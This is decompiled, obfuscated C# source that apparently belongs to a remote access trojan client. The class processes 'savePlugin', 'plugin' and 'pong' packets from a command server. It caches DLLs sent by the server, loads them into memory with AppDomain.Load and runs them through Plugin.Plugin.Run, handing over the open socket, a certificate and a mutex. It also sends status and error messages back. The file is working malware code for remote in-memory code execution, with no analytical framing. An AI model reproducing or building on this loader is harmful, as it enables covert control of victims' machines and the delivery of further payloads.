using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using ns1;
using ns17;
using ns19;
using ns21;

namespace ns20;

public static class GClass27
{
	[CompilerGenerated]
	private static class Class84
	{
		public static CallSite<Action<CallSite, object, Socket, X509Certificate2, string, byte[], Mutex, string, string, string>> callSite_0;
	}

	public static List<GClass18> list_0 = new List<GClass18>();

	public static void smethod_0(object object_0)
	{
		try
		{
			GClass18 gClass = new GClass18();
			gClass.method_28((byte[])object_0);
			switch (gClass.method_21("Packet").String_0)
			{
			case "savePlugin":
				GClass26.smethod_0(gClass.method_21("Hash").String_0, gClass.method_21("Dll").method_16());
				{
					foreach (GClass18 item in list_0.ToList())
					{
						if (item.method_21("Dll").String_0 == gClass.method_21("Hash").String_0)
						{
							smethod_1(item);
							list_0.Remove(item);
						}
					}
					break;
				}
			case "plugin":
				try
				{
					if (GClass26.smethod_1(gClass.method_21("Dll").String_0) == null)
					{
						list_0.Add(gClass);
						GClass18 gClass3 = new GClass18();
						gClass3.method_21("Packet").method_23("sendPlugin");
						gClass3.method_21("Hashes").method_23(gClass.method_21("Dll").String_0);
						GClass28.smethod_5(gClass3.method_31());
					}
					else
					{
						smethod_1(gClass);
					}
					break;
				}
				catch (Exception ex)
				{
					smethod_3(ex.Message);
					break;
				}
			case "pong":
			{
				GClass28.Boolean_1 = false;
				GClass18 gClass2 = new GClass18();
				gClass2.method_21("Packet").method_23("pong");
				gClass2.method_21("Message").method_10(GClass28.Int32_0);
				GClass28.smethod_5(gClass2.method_31());
				GClass28.Int32_0 = 0;
				break;
			}
			}
		}
		catch (Exception ex2)
		{
			smethod_3(ex2.Message);
		}
	}

	private static void smethod_1(GClass18 gclass18_0)
	{
		dynamic val = Activator.CreateInstance(AppDomain.CurrentDomain.Load(GClass19.smethod_0(GClass26.smethod_1(gclass18_0.method_21("Dll").String_0))).GetType("Plugin.Plugin"));
		val.Run(GClass28.Socket_0, GClass10.x509Certificate2_0, GClass10.string_15, gclass18_0.method_21("Msgpack").method_16(), GClass23.mutex_0, GClass10.string_9, GClass10.string_14, GClass10.string_5);
		smethod_2();
	}

	private static void smethod_2()
	{
		GClass18 gClass = new GClass18();
		gClass.method_21("Packet").String_0 = "Received";
		GClass28.smethod_5(gClass.method_31());
		Thread.Sleep(1000);
	}

	public static void smethod_3(string string_0)
	{
		GClass18 gClass = new GClass18();
		gClass.method_21("Packet").String_0 = "Error";
		gClass.method_21("Error").String_0 = string_0;
		GClass28.smethod_5(gClass.method_31());
	}
}
